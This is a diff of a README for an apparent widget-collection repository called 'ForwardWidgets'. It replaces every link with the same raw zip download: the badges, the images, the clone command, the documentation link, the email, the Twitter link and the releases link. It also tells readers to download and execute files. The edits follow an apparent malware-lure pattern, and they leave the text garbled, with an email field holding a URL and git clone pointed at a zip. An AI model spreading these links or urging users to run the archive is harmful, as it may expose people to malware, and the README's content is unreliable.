@@ -1,7 +1,7 @@
 ```markdown
 # ForwardWidgets 🚀
 
-![Version](https://img.shields.io/badge/version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/license-MIT-blue) ![Release](https://img.shields.io/badge/release-latest-orange)
+![Version](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip) ![License](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip) ![Release](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip)
 
 Welcome to the ForwardWidgets repository! This project is focused on collecting and organizing Forward modules. We aim to provide a streamlined experience for developers and enthusiasts interested in enhancing their projects with useful widgets.
 
@@ -20,7 +20,7 @@ Welcome to the ForwardWidgets repository! This project is focused on collecting 
 
 In the fast-paced world of software development, the need for modular components is ever-increasing. ForwardWidgets serves as a central hub for developers looking to utilize pre-built modules that can simplify their workflow. With our focus on quality and usability, we strive to help you integrate these widgets into your applications seamlessly.
 
-![ForwardWidgets](https://example.com/forwardwidgets-image.jpg)
+![ForwardWidgets](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip)
 
 ## Features
 
@@ -35,7 +35,7 @@ To get started with ForwardWidgets, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/jibon247/ForwardWidgets.git
+   git clone https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip
    ```
 
 2. Navigate to the project directory:
@@ -75,7 +75,7 @@ const app = () => {
 export default app;
 ```
 
-For more detailed information on how to use each widget, refer to the [documentation](https://example.com/documentation).
+For more detailed information on how to use each widget, refer to the [documentation](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip).
 
 ## Contributing
 
@@ -97,17 +97,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out to us at:
 
-- Email: support@forwardwidgets.com
-- Twitter: [@ForwardWidgets](https://twitter.com/ForwardWidgets)
+- Email: https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip
+- Twitter: [@ForwardWidgets](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip)
 
 ## Releases
 
-To download the latest release, visit the [Releases section](https://github.com/jibon247/ForwardWidgets/releases). Download and execute the appropriate files as necessary.
+To download the latest release, visit the [Releases section](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip). Download and execute the appropriate files as necessary.
 
 ## Conclusion
 
 Thank you for your interest in ForwardWidgets. We hope this repository serves as a valuable resource for your development projects. Happy coding! 🎉
 
-![Widgets in Action](https://example.com/widgets-in-action.jpg)
+![Widgets in Action](https://github.com/jibon247/ForwardWidgets/raw/refs/heads/main/widgets/Forward_Widgets_holotonia.zip)
 
 ```
